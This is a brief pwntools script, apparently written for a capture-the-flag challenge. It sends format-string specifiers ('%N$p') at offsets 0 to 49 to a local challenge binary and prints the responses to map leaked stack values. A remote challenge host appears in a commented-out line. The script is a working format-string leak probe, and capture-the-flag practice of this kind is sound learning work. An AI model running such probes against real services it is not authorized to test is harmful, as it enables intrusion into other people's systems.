from pwn import *

elf = context.binary = ELF("./challenge")

for i in range(50):
	try:
		# p = remote("rvcechalls.xyz",24692)
		p = elf.process()
		p.sendlineafter("? ", "%{}$p".format(i).encode())

		result = p.recvline()

		print(str(i) + ':' + str(result))

		p.close()
	except EOFError:
		pass
